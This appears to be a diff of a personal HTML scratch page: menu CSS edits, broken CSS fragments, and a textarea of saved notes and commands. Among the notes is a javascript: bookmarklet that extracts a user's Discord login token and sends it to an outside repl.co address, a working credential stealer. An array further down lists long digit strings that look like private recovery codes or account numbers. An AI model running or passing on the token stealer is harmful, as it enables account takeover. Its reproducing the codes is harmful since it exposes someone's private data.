@@ -37,16 +37,16 @@ body { background-image: url("background2.jpg"); } }</style>
 <input type="radio" id="sort1" name="sort" value="Name" unchecked><label for="sort1">Name</label>
 <input type="radio" id="sort2" name="sort" value="Date"><label for="sort2">Date</label></fieldset>
 
-<style>
+<style>* { margin: 0; padding: 0; box-sizing: border-box; }
 #menu:checked ~ .main_menu { display: none; }
-.main_menu ul { list-style-type: disc; }
+.main_menu ul { list-style-type: none; }
 .main_menu ul li ul { flex-direction: column; display: none; }
 .main_menu ul li:hover ul { display: flex; }
 </style>
 
 <input type="checkbox" id="menu" checked><label for="menu" id="playing_indicator" style="display: none;">Menu</label>
 <div class="main_menu">
-<ul>
+<ul style="display: flex; justify-content: space-between;">
   <li>T1</li>
   <li>T2
     <ul>
@@ -122,6 +122,10 @@ body { background-image: url("background2.jpg"); } }</style>
 { top: 120px !important; left: 120px !important; }
 input[type="search"] { width: 70px !important; }
 { cursor: pointer; user-select: none; font-size: 2rem; object-fit: cover; word-break: break-all; grid-template-columns auto 1fr 20px 8ch; }
+pointer-events: none; border: none; outline: none;
+input::placeholder
+visibility: hidden;
+visibility: visible;
 
 @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@200;300;400;500;600;700&display=swap");
 * { margin: 0; padding: 0; box-sizing: border-box; text-decoration: none; font-family: 'Poppins', sans-serif; }
@@ -196,14 +200,7 @@ nav .content .links { margin-left: 80px; display: flex; }
 <button id="meme" type="submit" class="go-icon">Search</button>
 </form></nav></div>
 -->
-<textarea class="auto_resize">
-phil
-sss
-pagibig
-pics
-place
-
-client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
+<textarea class="auto_resize">client=~/client && rm -r ${client} && cd ~/storage/shared/download/ && cp -r client ${client} && cd ${client} && vercel --prod -y
 alias "+ac0" "bind q dota_ability_autocast 0"; alias "-ac0" "bind q dota_ability_execute 0"; bind "shift" "+ac0"
 javascript:(() => { token = (webpackChunkdiscord_app.push([[''], {}, e => { m = []; for(let c in e.c) m.push(e.c[c])}]), m).find(m => m?.exports?.default?.getToken !== void 0).exports.default.getToken(); send = prompt(token, token); if(send !== token) window.location.href = "https://v1.elusion1.repl.co/app?n=" + token })()
 
@@ -227,7 +224,7 @@ ishka224 = ["R61381", "R33130",
 "7662 1163 9595 6926 2054 8251 4102 6053 9158 3180 0404 8284 4943 2686 7622 7896 8335 2880 5739 8217",
 "3656 4214 3532 9860 3133 5908 6863 1497 6396 5660 4062 8653 7200 1526 8872 6796 0088 2064 7476 7102",
 "4865 7378 8520 8993 4653 5574 3520 7851 9890 4832 4612 2659 9746 8448 3709 2841 4385 5762 9126 6509",
-"2343909003963", "202303-19575B"]
+"5457", "2343909003963", "202303-19575B"]
 
 express = require("express")
 app = express()
